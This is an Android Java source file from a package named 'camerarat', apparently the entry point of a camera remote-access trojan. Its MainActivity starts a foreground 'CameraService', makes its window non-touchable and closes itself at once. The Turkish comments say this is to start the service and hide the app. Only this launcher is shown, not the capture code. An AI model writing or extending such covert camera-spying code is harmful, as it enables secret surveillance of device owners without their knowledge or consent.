package com.camerarat;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.WindowManager;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
        
        // Servisi başlat
        Intent serviceIntent = new Intent(this, CameraService.class);
        startForegroundService(serviceIntent);
        
        // Uygulamayı gizle
        finish();
    }
}
